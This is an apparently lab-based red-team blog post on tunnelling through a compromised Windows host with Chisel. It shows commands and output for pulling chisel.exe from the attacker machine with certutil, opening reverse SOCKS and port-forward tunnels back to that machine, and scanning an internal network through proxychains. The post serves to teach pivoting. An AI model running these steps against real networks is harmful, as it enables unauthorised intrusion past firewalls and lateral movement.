---
title: "Chisel: Reverse Tunneling and SOCKS Proxying Through a Compromised Host"
date: "2025-10-15"
description: "How I used Chisel to tunnel through a compromised Windows machine and reach internal services — real commands, real terminal output, and when to use SOCKS vs port forwarding."
tags: ["red-team", "pivoting", "chisel", "tunneling", "socks"]
---

## The Problem This Solves

You have a shell on a machine. That machine has services running on its loopback (`127.0.0.1`) that you can't reach from your Kali box. Or it has access to an internal network that you don't.

Direct inbound connections to your target are blocked. Firewall rules, NAT, whatever — you can't reach in. But the target can reach out.

That's the scenario Chisel is built for. The target connects outward to you, and the tunnel goes in the other direction.

---

## Lab Environment

- Attacker: Kali Linux — `192.168.100.10`
- Foothold: Windows machine with shell access
- Internal services running on foothold's loopback: MySQL (`3306`), HTTP (`8083`)
- Goal: reach both services from Kali

---

## Step 1 — Get Chisel on Both Machines

On Kali, Chisel is in the repos:

```bash
sudo apt update && sudo apt install chisel
```

On the Windows target you need the matching version. Download the Windows x64 binary from the Chisel GitHub releases page. Transfer it via your existing shell — host it from Kali:

```bash
python3 -m http.server 80
```

Download on the Windows shell:

```cmd
certutil -urlcache -split -f "http://192.168.100.10/chisel.exe" chisel.exe
```

Make sure the versions match. Mismatched versions still connect but you'll see a warning in the logs.

---

## Step 2 — Start the Chisel Server on Kali

```bash
chisel server -p 8000 --reverse
```

Output:

```
2025/06/25 12:48:24 server: Reverse tunnelling enabled
2025/06/25 12:48:24 server: Fingerprint L00UNOqPoa9YIEbpla+uBb0yKAc4YIqZ/WDl=
2025/06/25 12:48:24 server: Listening on http://0.0.0.0:8000
```

`--reverse` is the important flag. It tells the server to accept reverse tunnels — connections initiated by the client that forward traffic back to the server side.

Note the fingerprint. You can use it on the client side for verification, though in lab environments most people skip that.

---

## Step 3 — Connect the Client from the Windows Shell

In your Windows shell:

```cmd
chisel.exe client 192.168.100.10:8000 R:socks
```

Output on the Windows side:

```
2025/06/25 09:49:09 client: Connecting to ws://192.168.100.10:8000
2025/06/25 09:49:10 client: Connected (Latency 5.4634ms)
```

Back on Kali, the server confirms:

```
2025/06/25 12:49:13 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
2025/06/25 12:49:13 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

The version mismatch warning is cosmetic — it still works. The important line is the last one: a SOCKS proxy is now listening on `127.0.0.1:1080` on your Kali machine. All traffic sent through that proxy exits from the Windows foothold.

---

## Two Approaches: Port Forwarding vs SOCKS

### Port Forwarding (One Service at a Time)

If you only need to reach one specific service — say MySQL on port `3306` — you can forward just that port:

```cmd
chisel.exe client --fingerprint HEoB1nCbMpJ7xkjsc3K1+OXhzX/LosSQH1N/D0xBXcU= 192.168.100.10:8080 R:1235:127.0.0.1:3306
```

Breaking that down:

| Part | Meaning |
|---|---|
| `192.168.100.10:8080` | Kali IP and Chisel server port |
| `R:` | Reverse mode |
| `1235` | Port on Kali that will receive the forwarded traffic |
| `127.0.0.1:3306` | Service on the target to forward (MySQL loopback) |

Now on Kali you can connect to MySQL as if it were local:

```bash
mysql -h 127.0.0.1 -P 1235 -u root -p
```

The problem: one tunnel per service. To also reach the HTTP service on `8083` you'd need to close this tunnel and reopen with a different port, or spawn another shell and run a second client. That gets messy fast.

### SOCKS Proxy (Everything at Once)

The `R:socks` flag we used earlier solves this. Instead of specifying which port goes where, you tell Chisel to create a SOCKS5 proxy. Every tool that supports SOCKS can route through it — you reach any service on any port without reopening the tunnel.

SOCKS listens on `127.0.0.1:1080` on Kali by default.

**For scanning:**

```bash
proxychains nmap -sT -Pn -n --top-ports 100 10.10.1.200
```

Configure `/etc/proxychains4.conf` to point to `socks5 127.0.0.1 1080`.

**For a browser:**

Set Firefox proxy settings to SOCKS5, host `127.0.0.1`, port `1080`. Any internal HTTP service the foothold can reach, you can browse directly.

---

## What's Actually Happening

Chisel tunnels over WebSocket — it looks like HTTPS traffic to most firewalls. That's why it works in environments where other tunneling tools are blocked. The target initiates an outbound HTTPS-looking connection to your server, and everything flows through that channel in reverse.

The SOCKS proxy sits on Kali's loopback. When a tool on Kali sends traffic through it, Chisel takes that traffic, sends it through the WebSocket tunnel to the Windows client, and the client sends it out from its own network interfaces — reaching things your Kali can't touch directly.

---

## Chisel vs Ligolo

Chisel with SOCKS is fine for single-service access and quick jobs. The limitation shows up when you're doing serious internal network scanning — proxychains adds overhead and some tools don't support SOCKS at all.

For proper internal network pivoting with full tool compatibility, Ligolo-ng is the better choice. Chisel is still the go-to for quick port forwards and situations where you just need to reach one service fast.

Use both. Know when each one fits.